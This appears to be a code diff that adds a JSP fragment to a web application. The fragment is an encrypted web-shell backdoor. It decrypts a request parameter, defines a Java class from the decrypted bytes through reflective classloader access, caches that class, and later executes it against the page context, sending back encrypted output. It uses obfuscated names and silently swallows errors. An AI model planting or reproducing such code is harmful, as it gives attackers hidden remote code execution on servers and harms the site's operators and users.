@@ -1,0 +1,34 @@
+try {
+    // 处理加密后的数据
+    byte[] requestData = base64Decode(request.getParameter("sign").getBytes());
+    requestData = base64Decode(requestData);
+    requestData = rsa(requestData, 2);
+    requestData = aes256(requestData, 2);
+
+    Class res_vt = null;
+    if (application.getAttribute("rsv_dl") == null) {
+        Class PB = Class.forName("com.sun.jmx.remote.util.OrderClassLoaders");
+        java.lang.reflect.Constructor c = PB.getDeclaredConstructor(new Class[]{ClassLoader.class, ClassLoader.class});
+        c.setAccessible(true);
+        Object tadfasf = Thread.currentThread().getContextClassLoader();
+        Object d = c.newInstance(new Object[]{tadfasf, tadfasf});
+        java.lang.reflect.Method lll = PB.getSuperclass().getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
+        lll.setAccessible(true);
+        Class zz = (Class) lll.invoke(d, new Object[]{requestData, 0, requestData.length});
+        application.setAttribute("rsv_dl", zz);
+    } else {
+        request.setAttribute("parameters", requestData);
+        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
+        Object f = ((Class) application.getAttribute("rsv_dl")).newInstance();
+        f.equals(arrOut);
+        f.equals(pageContext);
+        f.toString();
+        byte[] respon_data = arrOut.toByteArray();
+        respon_data = toHex(respon_data);
+        respon_data = rsa(respon_data, 1);
+        arrOut.reset();
+        response.getOutputStream().write(respon_data);
+    }
+} catch (Exception e) {
+}
+
